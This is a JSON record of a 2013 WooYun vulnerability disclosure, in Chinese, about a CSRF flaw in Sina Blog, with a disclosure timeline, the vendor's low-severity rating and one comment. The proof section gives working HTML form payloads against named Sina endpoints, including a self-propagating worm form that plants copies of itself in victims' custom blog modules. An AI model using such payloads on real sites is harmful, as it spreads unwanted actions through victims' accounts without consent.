{"id": 8877, "wybug_id": "wooyun-2013-035940", "wybug_title": "新浪另类CSRF蠕虫放大危害", "wybug_corp": "新浪", "wybug_author": "LaiX", "wybug_date": "2013-09-02 22:49", "wybug_open_date": "2013-10-17 22:49", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["漏洞利用", "利用技巧", "类型应用", "蠕虫", "绕过", "利用", "防护策略绕过"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-09-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-09-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-09-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-09-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-10-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-10-17：\t细节向公众公开  简要描述： 当CSRF遇到一个小伙伴时，会发生什么？ 详细说明：  一个<from>标签引发的血案。   漏洞证明：  我们知道新浪博客有一个转载功能：\n\n我们来试试其中一个，轻博客。构造如下HTML发布到博客首页的自定义组件里。\n\n\n<form name=\"IjaxForm\" action=\"http://control.blog.sina.com.cn/blog_rebuild/riaapi/blog/share2qing.php?domain=1\" method=\"post\" target=\"loadingIframe_thread3561\"><input type=\"hidden\" name=\"version\" value=\"7\"><input type=\"hidden\" name=\"blogId\" value=\"d31df6a10101qlbl\"><input type=\"hidden\" name=\"rnd\" value=\"1378116659115\"><input type=\"submit\" value=\"你敢不敢点我\"></form>\n其中blogId是文章的ID参数rnd参数 可以无视基本上绕过了CSRF防御准备好欺骗的文章，然后添加进自定义组件。当用户点击按钮时就可以转载我们的文章到轻博客，当然了只是转载文章，要让看见的用户再次感染,还得通过文章内容来欺骗访问再点击，岂不是很麻烦，这样感染力度就大大减少。那我们换个思路，我们知道新浪的CSRF只防御了外来域..而对本地域名是无视的，通过这个特点我们可以轻易的构造一个蠕虫攻击。那么如果我们构造的是发布自定义组件的CSRF会怎么样。通过抓包我发现了添加自定义组件的POST地址\nhttp://control.blog.sina.com.cn/riaapi/sys_module/edit_custmod_html_post.php?version=7&amp;domain=1\n我们构造如下payload:\n<form id=\"IjaxForm2\" action=\"http://control.blog.sina.com.cn/riaapi/sys_module/edit_custmod_html_post.php?version=7&amp;domain=1\" method=\"post\" target=\"loadingIframe_thread1554\"><input type=\"hidden\" name=\"Data\" value=\"<form id='IjaxForm2' action='http://control.blog.sina.com.cn/riaapi/sys_module/edit_custmod_html_post.php?version=7&amp;domain=1' method='post' target='loadingIframe_thread1554'><input type='hidden' name='Data' value='Hello Sina'><input type='hidden' name='Title' value='敢不敢点我'><input type='hidden' name='cid' value='1006'><input type='submit' value='敢不敢点我'></form>\"><input type=\"hidden\" name=\"Title\" value=\"敢不敢点我\"><input type=\"hidden\" name=\"cid\" value=\"1006\"><input type=\"submit\" value=\"敢不敢点我\"></form>\n\n\n由于逻辑有问题，这个代码至少也可以感染两层用户了..当用户点击按钮时，一些不为人知的事情正在发生着...难道仅仅是这样而已吗... 还有很多的POST我们都可以进行CSRF，这里就不再演示了。   修复方案：  阿木哥，礼物你懂的...   版权声明：转载请注明来源 LaiX@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：3  确认时间：2013-09-03 16:40 厂商回复： 感谢关注新浪安全，根据该漏洞的实际影响综合考虑给3rank 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-09-03 00:31 |    \t\t淡漠天空  \t\t\t( 实习白帽子  |\t\t\t        Rank:1113 漏洞数:142        | M:出售GOV  STATE NSA CIA NASA DHS Symant...)\t\t \n  CSRF大牛  膜拜坐等公开    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 3, "Ranks": null}